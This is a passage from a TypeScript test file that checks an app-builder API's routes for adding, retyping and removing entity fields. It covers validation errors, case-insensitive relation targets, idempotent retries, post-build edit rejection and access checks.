    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const entityName = project.spec.entities[0].name;

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "Status", type: "enum", required: true, enumValues: "New, In Progress, Done" }),
    });
    assert.equal(res.status, 200);
    const { project: updated } = (await res.json()) as {
      project: { spec: { entities: { name: string; fields: { name: string; type: string; required: boolean; enumValues?: string[] }[] }[] } };
    };
    const newField = updated.spec.entities.find((e) => e.name === entityName)!.fields.at(-1)!;
    assert.equal(newField.type, "enum");
    assert.equal(newField.required, true);
    assert.deepEqual(newField.enumValues, ["New", "In Progress", "Done"], "the comma-separated input must split into a trimmed array");
  });
});

test("adding an enum field with no enumValues (or a relation field with no relationTo) is rejected with 400, not silently defaulted", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-add-type2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const entityName = project.spec.entities[0].name;

    const missingEnumValues = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "Status", type: "enum" }),
    });
    assert.equal(missingEnumValues.status, 400);
    assert.equal(((await missingEnumValues.json()) as { code?: string }).code, "VALIDATION_ERROR");

    const missingRelationTo = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "Owner", type: "relation" }),
    });
    assert.equal(missingRelationTo.status, 400);
    assert.equal(((await missingRelationTo.json()) as { code?: string }).code, "VALIDATION_ERROR");
  });
});

test("adding a relation field whose relationTo names a real sibling entity in this project round-trips correctly, but a relationTo naming a non-existent entity is rejected with 400", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-add-relation1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    assert.deepEqual(project.spec.entities.map((e) => e.name), ["Customer", "Deal"]);

    const goodRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Deal/fields`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "Customer", type: "relation", relationTo: "Customer" }),
    });
    assert.equal(goodRes.status, 200);
    const { project: updated } = (await goodRes.json()) as {
      project: { spec: { entities: { name: string; fields: { name: string; type: string; relationTo?: string }[] }[] } };
    };
    const newField = updated.spec.entities.find((e) => e.name === "Deal")!.fields.at(-1)!;
    assert.equal(newField.type, "relation");
    assert.equal(newField.relationTo, "Customer");

    const badRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Deal/fields`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "Ghost", type: "relation", relationTo: "NoSuchEntity" }),
    });
    assert.equal(badRes.status, 400);
    assert.equal(((await badRes.json()) as { code?: string }).code, "RELATION_TARGET_NOT_FOUND");
  });
});

/**
 * Round 1196: this route's own relationTo check compared the submitted
 * value against `entity.name` with exact-case `===`, the same bug every
 * other relationTo-resolution call site in this app already had fixed
 * case-insensitively (rounds 1159-1188) -- missed here because these two
 * validation checks weren't named in any of those earlier sweeps. A real
 * entity name is case-sensitive but a case-only rename is a supported,
 * live, lossless action (migrate.ts), so a relationTo differing only by
 * letter case from the real entity's current name -- exactly what a
 * second browser tab's own stale dropdown selection would submit right
 * after a collaborator case-renames the target entity elsewhere -- must
 * still be accepted, not rejected as "not an entity in this project".
 */
test("adding a relation field whose relationTo names a real sibling entity differing only by letter case is accepted, not rejected as RELATION_TARGET_NOT_FOUND", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-add-relation-case@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    assert.deepEqual(project.spec.entities.map((e) => e.name), ["Customer", "Deal"]);

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Deal/fields`, {
      method: "POST",
      headers: authHeaders(token),
      // The real entity is "Customer" (PascalCase) -- submitting the
      // lowercase variant mirrors a stale dropdown selection from before
      // a case-only rename.
      body: JSON.stringify({ label: "Customer", type: "relation", relationTo: "customer" }),
    });
    assert.equal(res.status, 200, "a relationTo differing only by letter case from a real entity must be accepted");
    const { project: updated } = (await res.json()) as {
      project: { spec: { entities: { name: string; fields: { name: string; type: string; relationTo?: string }[] }[] } };
    };
    const newField = updated.spec.entities.find((e) => e.name === "Deal")!.fields.at(-1)!;
    assert.equal(newField.type, "relation");
  });
});

/**
 * The other real correction gap this round closes: a field's own
 * `required` flag was previously static from spec generation onward,
 * with no way to toggle it on the spec review screen at all (unlike its
 * label, which could already be renamed).
 */
test("PATCH .../fields/:fieldName/required toggles an existing field's required flag, and is rejected once the project is built", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-required1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: { name: string; required: boolean }[] }[] } };
    };
    const entityName = project.spec.entities[0].name;
    const fieldName = project.spec.entities[0].fields[0].name;
    const originalRequired = project.spec.entities[0].fields[0].required;

    const toggleRes = await fetch(
      `${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/required`,
      { method: "PATCH", headers: authHeaders(token), body: JSON.stringify({ required: !originalRequired }) },
    );
    assert.equal(toggleRes.status, 200);
    const { project: toggled } = (await toggleRes.json()) as {
      project: { spec: { entities: { name: string; fields: { name: string; required: boolean }[] }[] } };
    };
    const toggledField = toggled.spec.entities.find((e) => e.name === entityName)!.fields.find((f) => f.name === fieldName)!;
    assert.equal(toggledField.required, !originalRequired);

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    const afterBuildRes = await fetch(
      `${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/required`,
      { method: "PATCH", headers: authHeaders(token), body: JSON.stringify({ required: originalRequired }) },
    );
    assert.equal(afterBuildRes.status, 409);
    assert.equal(((await afterBuildRes.json()) as { code?: string }).code, "FIELD_EDIT_AFTER_BUILD");
  });
});

/** Round 960: same withIdempotency gap, and the same fix, as the entity-label PATCH route's own round-960 fix above -- see its own comment. */
test("PATCH .../fields/:fieldName/required retried with the same idempotency key after a newer edit landed in between replays the original response, instead of reverting the newer edit back to the stale value", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-required-idem@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: { name: string; required: boolean }[] }[] } };
    };
    const entityName = project.spec.entities[0].name;
    const fieldName = project.spec.entities[0].fields[0].name;

    const headers = { ...authHeaders(token), "x-idempotency-key": "field-required-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/required`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ required: true }),
    });
    assert.equal(firstRes.status, 200);
    const firstBody = await firstRes.json();

    const newerRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/required`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ required: false }),
    });
    assert.equal(newerRes.status, 200);

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/required`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ required: true }),
    });
    assert.equal(retryRes.status, 200);
    assert.deepEqual(await retryRes.json(), firstBody, "a retry with the same idempotency key must replay the original response verbatim, not re-run the mutation");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: current } = (await getRes.json()) as {
      project: { spec: { entities: { name: string; fields: { name: string; required: boolean }[] }[] } };
    };
    const currentField = current.spec.entities.find((e) => e.name === entityName)!.fields.find((f) => f.name === fieldName)!;
    assert.equal(currentField.required, false, "the retry must never revert the genuinely newer edit back to the stale required value");
  });
});

/**
 * Round 676: type/required/enumValues could only ever be set when a field
 * was first created (round 675) -- an existing field's type was otherwise
 * permanent, the one correction gap this chip still had. This mirrors the
 * add-field route's own type validation (enum needs enumValues, relation
 * needs a real relationTo), reused here against an existing field instead.
 */
test("PATCH .../fields/:fieldName/type changes a plain field's type directly, and is rejected once the project is built", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-type1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: { name: string; type: string }[] }[] } };
    };
    const entityName = project.spec.entities[0].name;
    const fieldName = project.spec.entities[0].fields[0].name;
    assert.equal(project.spec.entities[0].fields[0].type, "text");

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/type`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ type: "number" }),
    });
    assert.equal(res.status, 200);
    const { project: updated } = (await res.json()) as {
      project: { spec: { entities: { name: string; fields: { name: string; type: string }[] }[] } };
    };
    const updatedField = updated.spec.entities.find((e) => e.name === entityName)!.fields.find((f) => f.name === fieldName)!;
    assert.equal(updatedField.type, "number");

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    const afterBuildRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/type`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ type: "text" }),
    });
    assert.equal(afterBuildRes.status, 409);
    assert.equal(((await afterBuildRes.json()) as { code?: string }).code, "FIELD_EDIT_AFTER_BUILD");
  });
});

/** Round 960: same withIdempotency gap, and the same fix, as the entity-label PATCH route's own round-960 fix above -- see its own comment. */
test("PATCH .../fields/:fieldName/type retried with the same idempotency key after a newer edit landed in between replays the original response, instead of reverting the newer edit back to the stale type", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-type-idem@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: { name: string; type: string }[] }[] } };
    };
    const entityName = project.spec.entities[0].name;
    const fieldName = project.spec.entities[0].fields[0].name;
    assert.equal(project.spec.entities[0].fields[0].type, "text");

    const headers = { ...authHeaders(token), "x-idempotency-key": "field-type-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/type`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ type: "number" }),
    });
    assert.equal(firstRes.status, 200);
    const firstBody = await firstRes.json();

    const newerRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/type`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ type: "date" }),
    });
    assert.equal(newerRes.status, 200);

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/type`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ type: "number" }),
    });
    assert.equal(retryRes.status, 200);
    assert.deepEqual(await retryRes.json(), firstBody, "a retry with the same idempotency key must replay the original response verbatim, not re-run the mutation");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: current } = (await getRes.json()) as {
      project: { spec: { entities: { name: string; fields: { name: string; type: string }[] }[] } };
    };
    const currentField = current.spec.entities.find((e) => e.name === entityName)!.fields.find((f) => f.name === fieldName)!;
    assert.equal(currentField.type, "date", "the retry must never revert the genuinely newer edit back to the stale type");
  });
});

test("switching a field's type to enum or relation requires the matching extra data, and clears it when switching away", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-type2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    assert.deepEqual(project.spec.entities.map((e) => e.name), ["Customer", "Deal"]);
    const entityName = project.spec.entities[0].name;
    const fieldName = project.spec.entities[0].fields?.[0]?.name ?? "name";

    const missingEnumValues = await fetch(
      `${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/type`,
      { method: "PATCH", headers: authHeaders(token), body: JSON.stringify({ type: "enum" }) },
    );
    assert.equal(missingEnumValues.status, 400);
    assert.equal(((await missingEnumValues.json()) as { code?: string }).code, "VALIDATION_ERROR");

    const missingRelationTo = await fetch(
      `${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/type`,
      { method: "PATCH", headers: authHeaders(token), body: JSON.stringify({ type: "relation" }) },
    );
    assert.equal(missingRelationTo.status, 400);
    assert.equal(((await missingRelationTo.json()) as { code?: string }).code, "VALIDATION_ERROR");

    const badRelationTo = await fetch(
      `${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/type`,
      { method: "PATCH", headers: authHeaders(token), body: JSON.stringify({ type: "relation", relationTo: "NoSuchEntity" }) },
    );
    assert.equal(badRelationTo.status, 400);
    assert.equal(((await badRelationTo.json()) as { code?: string }).code, "RELATION_TARGET_NOT_FOUND");

    // Round 1196: see the identical POST .../fields test's own doc comment
    // -- same case-insensitive tolerance, same reason, for this sibling
    // route's own relationTo check. Reuses this same entity/field (rather
    // than introducing a new one) and targets the real sibling entity
    // "Deal" via its lowercase variant.
    const caseOnlyRelationTo = await fetch(
      `${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/type`,
      { method: "PATCH", headers: authHeaders(token), body: JSON.stringify({ type: "relation", relationTo: "deal" }) },
    );
    assert.equal(
      caseOnlyRelationTo.status,
      200,
      "a relationTo differing only by letter case from the real entity \"Deal\" must be accepted, not rejected as RELATION_TARGET_NOT_FOUND",
    );

    const toEnum = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/type`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ type: "enum", enumValues: "Red, Green, Blue" }),
    });
    assert.equal(toEnum.status, 200);
    const { project: enumProject } = (await toEnum.json()) as {
      project: { spec: { entities: { name: string; fields: { name: string; type: string; enumValues?: string[] }[] }[] } };
    };
    const enumField = enumProject.spec.entities.find((e) => e.name === entityName)!.fields.find((f) => f.name === fieldName)!;
    assert.equal(enumField.type, "enum");
    assert.deepEqual(enumField.enumValues, ["Red", "Green", "Blue"]);

    const toRelation = await fetch(
      `${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}/type`,
      { method: "PATCH", headers: authHeaders(token), body: JSON.stringify({ type: "relation", relationTo: "Deal" }) },
    );
    assert.equal(toRelation.status, 200);
    const { project: relationProject } = (await toRelation.json()) as {
      project: {
        spec: { entities: { name: string; fields: { name: string; type: string; enumValues?: string[]; relationTo?: string }[] }[] };
      };
    };
    const relationField = relationProject.spec.entities.find((e) => e.name === entityName)!.fields.find((f) => f.name === fieldName)!;
    assert.equal(relationField.type, "relation");
    assert.equal(relationField.relationTo, "Deal");
    assert.equal(relationField.enumValues, undefined, "switching away from enum must clear its now-stale enumValues");
  });
});

/**
 * Round 823's finding: unlike enumValues/relationTo just above (deliberately
 * cleared whenever they no longer apply), enumLabels kept the field's OLD
 * labels object verbatim whenever the new type stayed "enum" -- even when
 * enumValues itself changed. SpecListItemRemover.tsx's "edit values" button
 * (openDraftFor) re-submits this exact route with type staying "enum" but a
 * user-edited enumValues list -- removing/renaming a value used to leave its
 * old enumLabels entry permanently orphaned, with no other UI able to touch
 * enumLabels afterward. Uses the CRM template's own Deal.stage field, which
 * ships with real enumLabels for every one of its 5 declared values.
 */
test("switching a field's type to enum while also changing its enumValues drops enumLabels for any value no longer in the list", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-type-enumlabels@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects/from-template`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ templateId: "crm" }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: { name: string; enumValues?: string[]; enumLabels?: Record<string, string> }[] }[] } };
    };
    const deal = project.spec.entities.find((e) => e.name === "Deal")!;
    const stageField = deal.fields.find((f) => f.name === "stage")!;
    assert.deepEqual(stageField.enumValues, ["lead", "qualified", "proposal", "won", "lost"]);
    assert.deepEqual(Object.keys(stageField.enumLabels ?? {}).sort(), ["lead", "lost", "proposal", "qualified", "won"]);

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Deal/fields/stage/type`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ type: "enum", enumValues: "lead, qualified, proposal, won, archived" }),
    });
    assert.equal(res.status, 200);
    const { project: updated } = (await res.json()) as {
      project: { spec: { entities: { name: string; fields: { name: string; enumValues?: string[]; enumLabels?: Record<string, string> }[] }[] } };
    };
    const updatedField = updated.spec.entities.find((e) => e.name === "Deal")!.fields.find((f) => f.name === "stage")!;
    assert.deepEqual(updatedField.enumValues, ["lead", "qualified", "proposal", "won", "archived"]);
    assert.equal(updatedField.enumLabels?.lost, undefined, "'lost' is no longer a declared value -- its old enumLabels entry must not survive");
    assert.equal(updatedField.enumLabels?.archived, undefined, "'archived' is a brand-new value with no label of its own yet");
    assert.equal(updatedField.enumLabels?.lead, "ליד", "a value that survived the edit unchanged must keep its own real label");
    assert.equal(updatedField.enumLabels?.won, "נסגרה בהצלחה", "a value that survived the edit unchanged must keep its own real label");
  });
});

/**
 * Round 949: a third, independently-unswept instance of the case-only-
 * rename bug class rounds 946/947 already closed (checkpointDiff.ts,
 * pipeline.ts's carryForwardLabels/computeImpact) -- the exact-string
 * `.includes(value)` filter just above mishandled a value renamed ONLY by
 * letter case (e.g. correcting "lost" to "Lost" via the "edit values"
 * form) the same way: the old label survived keyed by "lost", which the
 * exact-string check no longer finds in the new list, so it was silently
 * dropped, with no label ever created for the new "Lost" key either --
 * discarding a real Hebrew translation for a purely cosmetic edit.
 */
test("switching a field's enumValues case-only-renames one value (same value, different letter case) and its own enumLabels entry survives, carried forward onto the new key", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-type-enumlabels-case@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects/from-template`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ templateId: "crm" }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Deal/fields/stage/type`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ type: "enum", enumValues: "lead, qualified, proposal, won, Lost" }),
    });
    assert.equal(res.status, 200);
    const { project: updated } = (await res.json()) as {
      project: { spec: { entities: { name: string; fields: { name: string; enumValues?: string[]; enumLabels?: Record<string, string> }[] }[] } };
    };
    const updatedField = updated.spec.entities.find((e) => e.name === "Deal")!.fields.find((f) => f.name === "stage")!;
    assert.deepEqual(updatedField.enumValues, ["lead", "qualified", "proposal", "won", "Lost"]);
    assert.equal(
      updatedField.enumLabels?.Lost,
      "אבדה",
      "a value renamed only by letter case must carry its own real label forward onto the new, re-cased key",
    );
    assert.equal(updatedField.enumLabels?.lost, undefined, "the old, now-unused casing must not also linger as a separate stale entry");
    assert.equal(updatedField.enumLabels?.lead, "ליד", "every other, untouched value must still keep its own real label");
  });
});

test("adding a blank/whitespace-only field label is rejected with 400 instead of appending an invalid field", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-add-blank@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string; fields: unknown[] }[] } } };
    const entityName = project.spec.entities[0].name;

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "   " }),
    });
    assert.equal(res.status, 400);
    assert.equal(((await res.json()) as { code?: string }).code, "VALIDATION_ERROR");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { entities: { name: string; fields: unknown[] }[] } } };
    assert.deepEqual(unchanged.spec.entities, project.spec.entities);
  });
});

test("adding a field to a non-existent entity 404s with ENTITY_NOT_FOUND", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-add-no-entity@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/NoSuchEntity/fields`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "Phone" }),
    });
    assert.equal(res.status, 404);
    assert.equal(((await res.json()) as { code?: string }).code, "ENTITY_NOT_FOUND");
  });
});

test("adding a field on a project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "field-add-owner2@example.com");
    const outsiderToken = await signup(baseUrl, "field-add-outsider2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${project.spec.entities[0].name}/fields`, {
      method: "POST",
      headers: authHeaders(outsiderToken),
      body: JSON.stringify({ label: "Should not be added" }),
    });
    assert.equal(res.status, 404);
  });
});

test("adding a field to a project that's already been built is rejected with FIELD_ADD_AFTER_BUILD, since the real database column and generated code would never reflect it", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-add-afterbuild@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    await collectSSE(buildRes);

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${project.spec.entities[0].name}/fields`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "Phone" }),
    });
    assert.equal(res.status, 409);
    assert.equal(((await res.json()) as { code?: string }).code, "FIELD_ADD_AFTER_BUILD");
  });
});

test("removing a field deletes it from the entity's fields list and reports the updated project", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-remove-owner1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: { name: string }[] }[] } };
    };
    const entityName = project.spec.entities[0].name;
    assert.ok(project.spec.entities[0].fields.length > 1, "the Customer entity from a plain CRM description should have more than one field");
    const fieldToRemove = project.spec.entities[0].fields[1].name;

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldToRemove}`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(res.status, 200);
    const { project: updated } = (await res.json()) as { project: { spec: { entities: { name: string; fields: { name: string }[] }[] } } };
    const updatedEntity = updated.spec.entities.find((e) => e.name === entityName)!;
    assert.ok(
      !updatedEntity.fields.some((f) => f.name === fieldToRemove),
      "the removed field must no longer be present",
    );
    assert.equal(updatedEntity.fields.length, project.spec.entities[0].fields.length - 1);
  });
});

/**
 * Round 941: same withIdempotency gap, and the same fix, as the
 * entity-removal DELETE route's own identical test above -- the
 * sibling POST (add field) route already has this protection; this
 * DELETE route never did. A response lost in transit after the field
 * was already removed must replay that success on retry, not 404 on
 * the already-removed field.
 */
test("DELETE .../fields/:fieldName retried with the same idempotency key after the first attempt already succeeded replays the original 200, instead of 404ing on the already-removed field", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-remove-idem@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: { name: string }[] }[] } };
    };
    const entityName = project.spec.entities[0].name;
    assert.ok(project.spec.entities[0].fields.length > 1, "the Customer entity from a plain CRM description should have more than one field");
    const fieldToRemove = project.spec.entities[0].fields[1].name;

    const headers = { ...authHeaders(token), "x-idempotency-key": "field-remove-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldToRemove}`, {
      method: "DELETE",
      headers,
    });
    assert.equal(firstRes.status, 200);
    const { project: afterFirst } = (await firstRes.json()) as { project: { spec: { entities: { name: string; fields: { name: string }[] }[] } } };
    assert.ok(
      !afterFirst.spec.entities.find((e) => e.name === entityName)!.fields.some((f) => f.name === fieldToRemove),
      "the field must genuinely be gone after the first call",
    );

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldToRemove}`, {
      method: "DELETE",
      headers,
    });
    assert.equal(
      retryRes.status,
      200,
      "a retried removal with the same idempotency key must replay the original success, not 404 on the already-removed field",
    );
    const { project: afterRetry } = (await retryRes.json()) as { project: { spec: { entities: { name: string; fields: { name: string }[] }[] } } };
    assert.deepEqual(afterRetry.spec.entities, afterFirst.spec.entities, "the replayed response must match the original success exactly");
  });
});

test("removing fields down to the last remaining one is rejected with 400 instead of crashing -- EntitySchema requires fields.min(1)", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-remove-lastone@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: { name: string }[] }[] } };
    };
    const entityName = project.spec.entities[0].name;
    const fieldNames = project.spec.entities[0].fields.map((f) => f.name);
    assert.ok(fieldNames.length > 1, "the Customer entity from a plain CRM description should have more than one field");

    for (const fieldName of fieldNames.slice(0, -1)) {
      const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldName}`, {
        method: "DELETE",
        headers: authHeaders(token),
      });
      assert.equal(res.status, 200, `removing "${fieldName}" down to one remaining field must still succeed`);
    }

    const lastRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/${fieldNames.at(-1)}`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(lastRes.status, 400, "removing the very last field must be rejected, not crash");
    assert.equal(((await lastRes.json()) as { code?: string }).code, "VALIDATION_ERROR");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { entities: { name: string; fields: unknown[] }[] } } };
    assert.equal(
      unchanged.spec.entities.find((e) => e.name === entityName)!.fields.length,
      1,
      "the one remaining field must survive the rejected attempt untouched",
    );
  });
});

test("removing a field name that doesn't exist on the entity 404s with FIELD_NOT_FOUND, and the fields list is left untouched", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-remove-notfound@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: unknown[] }[] } };
    };
    const entityName = project.spec.entities[0].name;

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields/NoSuchField`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(res.status, 404);
    assert.equal(((await res.json()) as { code?: string }).code, "FIELD_NOT_FOUND");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { entities: { name: string; fields: unknown[] }[] } } };
    assert.deepEqual(unchanged.spec.entities, project.spec.entities);
  });
});

test("removing a field on a project you have no access to still 404s, the same as any other project route", async () => {
